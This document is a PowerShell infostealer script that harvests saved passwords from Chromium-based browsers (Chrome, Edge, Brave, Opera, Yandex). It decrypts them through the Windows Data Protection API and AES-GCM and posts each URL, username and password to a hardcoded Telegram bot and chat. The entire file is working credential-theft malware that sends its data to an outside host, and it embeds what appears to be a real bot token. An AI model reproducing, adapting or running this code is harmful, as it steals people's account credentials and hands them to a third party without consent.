<#
.SYNOPSIS
    Extracts saved passwords from various browsers and sends them via Telegram.
.DESCRIPTION
    This script searches for saved passwords in multiple Chromium-based browsers,
    decrypts them using the Windows Data Protection API, and sends the results
    to a specified Telegram chat.
.NOTES
    This script requires administrative privileges to access browser data files.
    File Name: BrowserPasswordExtractor.ps1
    Author: Anonymous
    Version: 1.0
#>

# Telegram Bot settings
$BOT_TOKEN = "7896528275:AAEWHHIWJrdPFJ2qR5V_OcLleSmQV7mx7Yw"
$CHAT_ID = "1046292733"



# Browser paths
$browsers = @{
    'Chrome' = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    'Edge' = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    'Brave' = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    'Opera' = "$env:APPDATA\Opera Software\Opera Stable"
    'Yandex' = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"
}

# Load SQLite assembly
Add-Type -Path "System.Data.SQLite.dll"

function Get-MasterKey {
    param($path)
    
    try {
        $localState = Get-Content "$path\Local State" -Raw | ConvertFrom-Json
        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)]
        
        return [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKey, 
            $null, 
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
    } catch {
        return $null
    }
}

function Decrypt-Password {
    param($encryptedData, $masterKey)
    
    try {
        $iv = $encryptedData[3..14]
        $payload = $encryptedData[15..($encryptedData.Length-1)]
        
        # For AES-256-GCM (Chrome v80+)
        if ($masterKey) {
            $aes = New-Object System.Security.Cryptography.AesGcm $masterKey
            $decrypted = [byte[]]::new($payload.Length-16)
            $tag = $payload[($payload.Length-16)..($payload.Length-1)]
            $aes.Decrypt($iv, $payload[0..($payload.Length-17)], $tag, $decrypted)
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        # For older DPAPI encryption
        else {
            return [System.Text.Encoding]::UTF8.GetString(
                [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $payload, 
                    $null, 
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                )
            )
        }
    } catch {
        return $null
    }
}

function Get-Passwords {
    $results = @()
    
    foreach ($browser in $browsers.GetEnumerator()) {
        $name = $browser.Name
        $path = $browser.Value
        
        if (-not (Test-Path $path)) { continue }
        
        try {
            $masterKey = Get-MasterKey $path
            $loginData = "$path\Default\Login Data"
            
            if (-not (Test-Path $loginData)) { continue }
            
            # Copy DB to avoid locking
            $tempDB = "$env:TEMP\chrome_passwords.db"
            Copy-Item $loginData -Destination $tempDB -Force
            
            # Query DB
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDB;")
            $conn.Open()
            
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $url = $reader.GetString(0)
                $user = $reader.GetString(1)
                $encPass = $reader.GetValue(2)
                
                if ($url -and $user -and $encPass) {
                    $password = Decrypt-Password $encPass $masterKey
                    if ($password) {
                        $results += "üîë <b>$name</b>`nüåê <b>URL:</b> $url`nüë§ <b>User:</b> $user`nüîí <b>Pass:</b> $password`n"
                    }
                }
            }
            
            $reader.Close()
            $conn.Close()
            Remove-Item $tempDB -Force
        } catch {
            Write-Host "Error with $name : $_"
            continue
        }
    }
    
    return $results
}

function Send-ToTelegram {
    param($message)
    
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{
        chat_id = $CHAT_ID
        text = $message
        parse_mode = "HTML"
        disable_web_page_preview = $true
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -TimeoutSec 10 | Out-Null
    } catch {
        Write-Host "Telegram send failed: $_"
    }
}

# Main execution
try {
    $passwords = Get-Passwords
    if ($passwords.Count -gt 0) {
        $chunkSize = 10
        for ($i = 0; $i -lt $passwords.Count; $i += $chunkSize) {
            $chunk = $passwords[$i..($i+$chunkSize-1)] -join "`n`n"
            Send-ToTelegram $chunk
        }
    }
} catch {
    Write-Host "Fatal error: $_"
}
